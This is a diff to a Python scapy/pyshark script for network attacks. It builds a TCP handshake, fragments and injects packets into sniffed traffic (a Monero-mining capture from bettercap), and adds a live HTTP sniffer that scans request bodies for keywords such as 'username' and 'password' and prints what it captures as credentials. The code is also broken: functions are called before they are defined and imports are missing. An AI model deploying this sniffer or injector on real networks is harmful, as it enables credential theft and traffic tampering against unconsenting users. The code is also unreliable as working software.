@@ -1,5 +1,5 @@
-#! /bin/usr/env/python3
-
+#!/bin/usr/env/python3
+import  pyshark
 from scapy.all import *
 from random import randint
 import StringIO
@@ -8,6 +8,9 @@ import math
 import os
 import time
 
+
+
+
 print("Started");
 
 sip = "MY.SOURCE.IP.ADDRESS"
@@ -15,6 +18,7 @@ dip = "MY.DESTINATION.IP.ADDRESS"
 sprt = 50000   #temporary
 dprt = 60000
 
+# HS
 packetEther = Ether()
 ip = IP(src = sip, dst = dip)
 syn_packet = TCP(sport = sprt, dport = dprt, flags = "S", seq = 100)
@@ -26,10 +30,13 @@ ack_packet = TCP(sport = sprt, dport = dprt, flags = "A", seq = 101, ack = my_ac
 send(ip/ack_packet)
 
 # SNIFFED from bettercap
-sniffed_pkts = rdpcap("/root/tmp/bettercap/monero_mining.pcap")
+capture = pyshark.LiveCapture(get_args(), display_filter='tcp')
+# sniffed_pkts = rdpcap("/root/tmp/bettercap/monero_mining.pcap")
 
-p1 = Process(target = fragment_execute(sniffed_pkts, 500))
-p2 = Process(target = inserting_packet(4, 1000))
+# sniffer(interface)
+for packet in capture:
+    p1 = Process(target = fragment_execute(capture, 500))
+    p2 = Process(target = inserting_packet(4, 1000))
 
 # iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
 
@@ -39,8 +46,41 @@ p2.start()
 p1.join()
 p2.join()
 
+def get_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-i', '--interface', dest = 'interface', help = 'Interface Name for which packet is supposed to be captured.')
+    options = parser.parse_args()
+    
+    if not options.interface:
+        parser.error('[-] Please specify the name of the interface, use --help for more info.')
+        
+    return options.interface
+
+def sniffer(interface):
+    scapy.sniff(iface = interface, store = False, prn = process_packet)
+
 def print_package(pkts):
     packet.show()
+
+keywords = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name')
+
+def get_credentials(packet):
+    if packet.haslayer(scapy.Raw):
+        field_load = packet[scapy.Raw].load.decode('utf-8')
+        for keyword in keywords:
+            if keyword in field_load:
+                return field_load
+
+def process_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        url = get_url(packet)
+        print('[+] HTTP Requests/URL Requested -> {}'.format(url), '\n')
+        cred = get_credentials(packet)
+        if cred:
+            print('\n\n[+] Possible Credential Information -> {}'.format(cred), '\n\n')
+
+def get_url(packet):
+    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')
 
 #PACKET INSERTION
 def inserting_packet(interval, attack_length):
@@ -134,3 +174,4 @@ def generate_tcp_packet(payload_size, fragsize=1460):
 
     payload.append(str(num_frags) * (payload_size - (fragsize * num_frags)))
     return IP()/TCP(flags="")/(''.join(payload))
+    
